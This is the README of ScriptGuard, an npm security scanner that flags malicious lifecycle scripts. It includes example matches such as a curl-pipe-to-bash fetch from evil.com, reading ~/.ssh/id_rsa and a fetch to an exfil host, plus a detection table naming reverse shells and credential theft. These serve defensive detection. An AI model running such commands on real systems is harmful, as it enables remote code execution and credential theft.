# ScriptGuard 🔒

[![npm version](https://badge.fury.io/js/scriptguard.svg)](https://www.npmjs.com/package/scriptguard)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/ferrierepete/scriptguard)
[![Node.js Version](https://img.shields.io/node/v/scriptguard.svg)](https://nodejs.org)

> **Security scanner for npm package lifecycle scripts** — detect malicious `postinstall`, `preinstall`, and `prepare` scripts before they run.

npm supply chain attacks often hide in lifecycle scripts — code that runs automatically during `npm install`. ScriptGuard scans installed packages and flags dangerous patterns like remote code execution, credential theft, data exfiltration, and obfuscated payloads.

## Install

```bash
npm install -g scriptguard
```

## Usage

### Scan your project

```bash
# Scan all installed packages for malicious lifecycle scripts
scriptguard scan

# Scan a specific project path
scriptguard scan --path /path/to/project

# Output as JSON for CI pipelines
scriptguard scan --format json

# Fail CI if high/critical findings found
scriptguard scan --fail-on high

# SARIF output for GitHub Advanced Security
scriptguard scan --format sarif
```

### Check a single package.json

```bash
scriptguard check ./package.json
scriptguard check ./some-module/package.json --format json
```

### List all detection patterns

```bash
scriptguard patterns
```

## What It Detects

ScriptGuard uses 26 detection patterns across 6 categories:

| Category | Examples |
|----------|---------|
| **Network** | `curl \| bash`, silent HTTP requests, DNS exfiltration |
| **Execution** | `eval()`, `child_process`, shell exec, `node -e` |
| **Filesystem** | SSH key access, AWS credential reading, `/etc/passwd` access |
| **Exfiltration** | `process.env` reads, clipboard access, keychain access |
| **Obfuscation** | base64 decode + eval, hex-encoded payloads |
| **Crypto** | Cryptocurrency miners, reverse shells |

## Output Formats

- **Table** (default) — human-readable terminal output with risk scores
- **JSON** — structured data for tooling integration
- **SARIF** — GitHub Advanced Security compatible format

## CI/CD Integration

```yaml
# GitHub Actions
- name: ScriptGuard Security Scan
  run: npx scriptguard scan --fail-on high --format sarif > scriptguard-results.sarif
```

## Programmatic API

```typescript
import { scanProject, analyzePackage } from 'scriptguard';

// Scan an entire project
const result = scanProject({ path: '.', includeDev: false, minRiskLevel: 'low', format: 'table' });
console.log(`Found ${result.totalFindings} findings`);

// Analyze a single package's scripts
const analysis = analyzePackage('my-pkg', '1.0.0', { postinstall: 'curl http://evil.com | sh' });
console.log(analysis.riskLevel); // 'critical'
```

## Why This Exists

- **824+ malicious OpenClaw skills** were found on ClawHub (20% contamination rate)
- **pino-SDK-v2** exfiltrated `.env` secrets to Discord via postinstall
- **Shai-Hulud** supply chain attack compromised hundreds of npm packages
- `npm audit` only checks for known CVEs — not malicious behavior patterns
- No dedicated tool existed for scanning lifecycle scripts

## Tech Stack

- TypeScript, Node.js 18+
- Commander.js (CLI), Zod (validation)
- Zero runtime dependencies beyond CLI framework

## Example Output

```bash
$ scriptguard scan

  🔒 ScriptGuard — npm Lifecycle Script Security Scanner

  Scanned 156 packages (42 with lifecycle scripts) in 23ms

  Summary
  Overall Risk: HIGH (52/100)
  Findings: 8 total — 🔴 2 critical | 🟠 3 high | 🟡 2 medium | ⚪ 1 low

  Findings
  ──────────────────────────────────────────────────────────────────────

  suspicious-package@2.1.0 🔴 CRITICAL [85/100]
    🔴 CRITICAL curl-pipe
      Downloads and executes remote code via curl pipe
      Match: curl -s https://evil.com/payload.sh | bash

    🔴 CRITICAL ssh-access
      Accesses SSH keys — credential theft risk
      Match: cat ~/.ssh/id_rsa

  data-exfil@1.0.3 🟠 HIGH [65/100]
    🟠 HIGH env-exfil
      Reads environment variables — may contain secrets
      Match: process.env

    🟠 HIGH http-request
      Outbound HTTP request detected
      Match: fetch('https://exfil.com/data')

  ──────────────────────────────────────────────────────────────────────
```

## Performance

ScriptGuard is optimized for speed:

| Project Size | Packages | Scan Time |
|--------------|----------|-----------|
| Small | < 50 | ~5-15ms |
| Medium | 50-200 | ~15-40ms |
| Large | 200-1000 | ~40-150ms |
| Monorepo | 1000+ | ~150-500ms |

**Why so fast?**
- Single-pass file system traversal
- No network requests during scanning
- Regex-based pattern matching (compiled at startup)
- Parallel-friendly architecture

## FAQ

### Does ScriptGuard execute any code from packages?

**No.** ScriptGuard only reads `package.json` files and analyzes script contents as strings. It never executes, requires, or runs code from scanned packages.

### What about false positives?

Some legitimate packages use lifecycle scripts for build steps, binaries, or platform-specific installations. ScriptGuard flags these as **LOW** risk with the pattern `lifecycle-script-present`. Review these manually to decide if they're safe for your environment.

### Can I suppress specific findings?

Not currently. If you have legitimate use cases that trigger warnings, consider:
1. Using `--min-risk high` to filter out low/medium findings
2. Adding package-specific exclusions in your CI pipeline
3. Contributing a `.scriptguardignore` feature request!

### How does this differ from `npm audit`?

| | npm audit | ScriptGuard |
|---|-----------|-------------|
| What it checks | Known CVEs in dependencies | Malicious behavior patterns |
| Detection method | Vulnerability database | Static code analysis |
| What it catches | Outdated versions with known exploits | Zero-day attacks, obfuscated code |
| Scope | All dependency code | Lifecycle scripts only |

Use them together for comprehensive coverage.

### Should I run this in CI?

**Absolutely.** Add ScriptGuard to your CI pipeline to catch supply chain attacks before they reach production:

```yaml
- name: Run ScriptGuard
  run: npx scriptguard scan --fail-on high
```

## Troubleshooting

### "No node_modules found"

ScriptGuard expects to run in a directory with a `node_modules` folder. If you're in a monorepo or using a different structure:
```bash
scriptguard scan --path ./packages/frontend
```

### High memory usage on large projects

If scanning 1000+ packages causes memory issues:
```bash
# Scan individual package directories
scriptguard scan --path ./node_modules/package-name
```

### Permission errors reading package.json

Some packages have restricted file permissions. ScriptGuard will skip these and continue scanning other packages. Check your file system permissions if you see many skipped packages.

## Development

Want to contribute or hack on ScriptGuard?

```bash
# Clone the repo
git clone https://github.com/ferrierepete/scriptguard.git
cd scriptguard

# Install dependencies
npm install

# Run tests
npm test

# Watch mode for development
npm run test:watch

# Build TypeScript
npm run build

# Run locally (before publishing)
npm link
scriptguard scan
```

### Project Structure

```
scriptguard/
├── src/
│   ├── cli.ts              # Commander.js CLI entry point
│   ├── index.ts            # Public API exports
│   ├── types/
│   │   └── index.ts        # TypeScript definitions
│   └── scanners/
│       ├── index.ts        # Scan orchestration
│       ├── lifecycle.ts    # package.json parsing
│       └── patterns.ts     # 26 detection rules
├── tests/
│   ├── scanner.test.ts     # Vitest test suite
│   └── fixtures/           # Sample package.json files
└── dist/                   # Compiled JavaScript (generated)
```

### Adding New Detection Patterns

Edit `src/scanners/patterns.ts` and add to the `PATTERN_RULES` array:

```typescript
{
  name: 'your-pattern',
  pattern: /your-regex-here/,
  riskLevel: 'high',  // or 'critical', 'medium', 'low'
  description: 'What this pattern detects',
  category: 'network',  // or 'execution', 'filesystem', etc.
}
```

Then add tests in `tests/scanner.test.ts`.

## Contributing

Contributions are welcome! Here's how to help:

1. **Report bugs** — Open an issue with reproduction steps
2. **Suggest features** — Share your use case in Discussions
3. **Submit patterns** — Add new detection rules (see above)
4. **Improve docs** — Fix typos, clarify examples
5. **Fix bugs** — Pull requests welcome!

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

## Resources

- **npm Package**: https://www.npmjs.com/package/scriptguard
- **GitHub Repository**: https://github.com/ferrierepete/scriptguard
- **Report Issues**: https://github.com/ferrierepete/scriptguard/issues
- **Discussions**: https://github.com/ferrierepete/scriptguard/discussions

## Related Tools

- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) — Official vulnerability scanner
- [snyk](https://snyk.io/) — Dependency vulnerability monitoring
- [lockfile-lint](https://github.com/lirantal/lockfile-lint) — Lockfile policy enforcement

## License

MIT © [Peter Ferriere](https://github.com/ferrierepete)
